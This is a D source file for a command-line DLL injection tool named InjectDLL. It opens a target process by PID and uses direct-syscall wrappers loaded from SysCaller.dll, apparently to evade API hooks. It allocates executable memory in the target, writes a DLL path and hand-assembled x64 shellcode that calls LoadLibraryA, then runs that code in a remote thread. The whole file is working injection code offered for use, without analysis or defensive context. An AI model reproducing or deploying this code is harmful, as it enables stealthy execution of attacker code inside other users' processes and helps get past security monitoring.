import core.sys.windows.windows;
import core.stdc.stdint;
import core.stdc.stdlib;
import core.stdc.string;
import std.stdio;
import std.string;
import std.conv;

alias NTSTATUS = uint;

extern(Windows) alias PFN_SysAllocateVirtualMemoryEx = NTSTATUS function(
    HANDLE /*ProcessHandle*/,
    void** /*BaseAddress*/,
    size_t* /*RegionSize*/,
    uint /*AllocationType*/,
    uint /*Protect*/,
    void* /*ExtendedParameters*/,
    uint /*ExtendedCount*/
);

extern(Windows) alias PFN_SysWriteVirtualMemory = NTSTATUS function(
    HANDLE /*ProcessHandle*/,
    void* /*BaseAddress*/,
    void* /*Buffer*/,
    size_t /*BufferSize*/,
    size_t* /*NumberOfBytesWritten*/
);

extern(Windows) alias PFN_SysCreateThreadEx = NTSTATUS function(
    HANDLE* /*ThreadHandle*/,
    uint /*DesiredAccess*/,
    void* /*ObjectAttributes*/,
    HANDLE /*ProcessHandle*/,
    void* /*StartRoutine*/,
    void* /*Argument*/,
    uint /*CreateFlags*/,
    size_t /*ZeroBits*/,
    size_t /*StackSize*/,
    size_t /*MaximumStackSize*/,
    void* /*AttributeList*/
);

extern(Windows) alias PFN_SysClose = NTSTATUS function(HANDLE);

enum MEM_COMMIT = 0x1000;
enum MEM_RESERVE = 0x2000;
enum PAGE_EXECUTE_READWRITE = 0x40;
enum THREAD_ALL_ACCESS = 0x1FFFFF;
enum PROCESS_ALL_ACCESS = 0x1F0FFF;

bool NT_SUCCESS(NTSTATUS status) { return cast(int)status >= 0; }

void appendLE64(ref ubyte[] arr, size_t value)
{
    foreach (i; 0 .. 8)
        arr ~= cast(ubyte)((value >> (8*i)) & 0xFF);
}

int main(string[] args)
{
    if (args.length != 3)
    {
        writeln("Usage: InjectDLL <pid> <dll_path>");
        return 1;
    }

    uint pid = to!uint(args[1]);
    string dllPath = args[2];

    HMODULE hSysCaller = LoadLibraryA("SysCaller.dll");
    if (hSysCaller is null)
    {
        writeln("[!] Failed to load SysCaller.dll");
        return 1;
    }
    auto SysAllocateVirtualMemoryEx = cast(PFN_SysAllocateVirtualMemoryEx) GetProcAddress(hSysCaller, "SysAllocateVirtualMemoryEx");
    auto SysWriteVirtualMemory     = cast(PFN_SysWriteVirtualMemory)     GetProcAddress(hSysCaller, "SysWriteVirtualMemory");
    auto SysCreateThreadEx         = cast(PFN_SysCreateThreadEx)         GetProcAddress(hSysCaller, "SysCreateThreadEx");
    auto SysClose                  = cast(PFN_SysClose)                  GetProcAddress(hSysCaller, "SysClose");
    if (SysAllocateVirtualMemoryEx is null || SysWriteVirtualMemory is null || SysCreateThreadEx is null || SysClose is null)
    {
        writeln("[!] Failed to resolve SysCaller exports");
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess is null)
    {
        writefln("[!] Failed to open process %s", pid);
        return 1;
    }

    char[260] pathBuf;
    DWORD n = GetFullPathNameA(toStringz(dllPath), pathBuf.length, pathBuf.ptr, null);
    string absPath = (n > 0 && n < pathBuf.length) ? pathBuf[0 .. n].idup : dllPath;
    auto pathBytes = (absPath ~ '\0').dup;

    void* baseAddress = null;
    size_t regionSize = pathBytes.length;
    NTSTATUS status = SysAllocateVirtualMemoryEx(hProcess, &baseAddress, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, null, 0);
    if (!NT_SUCCESS(status))
    {
        writefln("[!] Failed to allocate memory for DLL path. Status: 0x%08X", status);
        CloseHandle(hProcess);
        return 1;
    }
    writefln("[+] Allocated DLL path memory at: 0x%016X", cast(size_t)baseAddress);

    size_t bytesWritten = 0;
    status = SysWriteVirtualMemory(hProcess, baseAddress, pathBytes.ptr, pathBytes.length, &bytesWritten);
    if (!NT_SUCCESS(status) || bytesWritten != pathBytes.length)
    {
        writefln("[!] Failed to write DLL path. Status: 0x%08X, Bytes written: %s", status, bytesWritten);
        CloseHandle(hProcess);
        return 1;
    }
    writeln("[+] Successfully wrote DLL path to memory");

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 is null)
    {
        writeln("[!] Failed to get kernel32.dll handle");
        CloseHandle(hProcess);
        return 1;
    }
    auto pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibraryA is null)
    {
        writeln("[!] Failed to get LoadLibraryA address");
        CloseHandle(hProcess);
        return 1;
    }
    writefln("[+] LoadLibraryA address: 0x%016X", cast(size_t)pLoadLibraryA);

    ubyte[] sc;
    sc ~= [cast(ubyte)0x48, 0x83, 0xEC, 0x28];
    sc ~= [cast(ubyte)0x48, 0xB9];
    appendLE64(sc, cast(size_t)baseAddress);
    sc ~= [cast(ubyte)0x48, 0xB8];
    appendLE64(sc, cast(size_t)pLoadLibraryA);
    sc ~= [cast(ubyte)0xFF, 0xD0];             
    sc ~= [cast(ubyte)0x48, 0x83, 0xC4, 0x28]; 
    sc ~= [cast(ubyte)0xC3];                   

    void* scAddress = null;
    regionSize = sc.length;
    status = SysAllocateVirtualMemoryEx(hProcess, &scAddress, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, null, 0);
    if (!NT_SUCCESS(status))
    {
        writefln("[!] Failed to allocate shellcode. Status: 0x%08X", status);
        CloseHandle(hProcess);
        return 1;
    }
    writefln("[+] Allocated shellcode memory at: 0x%016X", cast(size_t)scAddress);

    bytesWritten = 0;
    status = SysWriteVirtualMemory(hProcess, scAddress, sc.ptr, sc.length, &bytesWritten);
    if (!NT_SUCCESS(status) || bytesWritten != sc.length)
    {
        writefln("[!] Failed to write shellcode. Status: 0x%08X, Bytes written: %s", status, bytesWritten);
        CloseHandle(hProcess);
        return 1;
    }
    writeln("[+] Successfully wrote shellcode");

    HANDLE hThread = null;
    status = SysCreateThreadEx(&hThread, THREAD_ALL_ACCESS, null, hProcess, scAddress, null, 0, 0, 0, 0, null);
    if (!NT_SUCCESS(status) || hThread is null)
    {
        writefln("[!] Failed to create remote thread. Status: 0x%08X, Handle: %p", status, hThread);
        CloseHandle(hProcess);
        return 1;
    }
    writefln("[+] Created remote thread: 0x%016X", cast(size_t)hThread);

    WaitForSingleObject(hThread, 5000);
    SysClose(hThread);

    CloseHandle(hProcess);
    writefln("[+] Successfully injected %s!", dllPath);
    return 0;
}